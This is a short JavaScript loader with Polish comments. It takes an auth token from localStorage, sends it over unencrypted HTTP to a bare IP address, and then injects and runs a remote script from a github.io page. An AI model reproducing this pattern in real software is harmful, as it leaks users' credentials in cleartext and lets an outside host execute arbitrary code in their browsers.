// Funkcja do pobrania tokenu z localStorage
function getAuthToken() {
    return localStorage.getItem('authToken');
}

// Funkcja do weryfikacji tokenu (przykładowa weryfikacja)
async function verifyToken(token) {
    if (!token) {
        console.error('Brak tokenu');
        return false;
    }

    try {
        // Wysyłamy zapytanie do backendu, aby zweryfikować token
        const response = await fetch('http://130.162.246.248:3000/api/verify', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ token }),
        });

        const data = await response.json();
        return data.success;  // Jeśli odpowiedź wskazuje na sukces
    } catch (error) {
        console.error('Błąd podczas weryfikacji tokenu:', error);
        return false;
    }
}

// Funkcja do załadowania skryptu z zewnętrznego URL
function loadExternalScript(url) {
    const script = document.createElement('script');
    script.src = url;
    script.onload = () => {
        console.log('Skrypt załadowany pomyślnie');
    };
    script.onerror = () => {
        console.error('Wystąpił błąd podczas ładowania skryptu');
    };
    document.body.appendChild(script);
}

// Sprawdzamy token po załadowaniu loader.js
const token = getAuthToken();

if (token) {
    // Weryfikujemy token
    verifyToken(token).then(isValid => {
        if (isValid) {
            console.log('Token zweryfikowany pomyślnie');
            
            // Załaduj główny skrypt (main.js)
            loadExternalScript('https://shaadow02.github.io/main.js');
        } else {
            console.error('Token jest nieważny lub niepoprawny');
        }
    });
} else {
    console.error('Brak tokenu w localStorage');
}
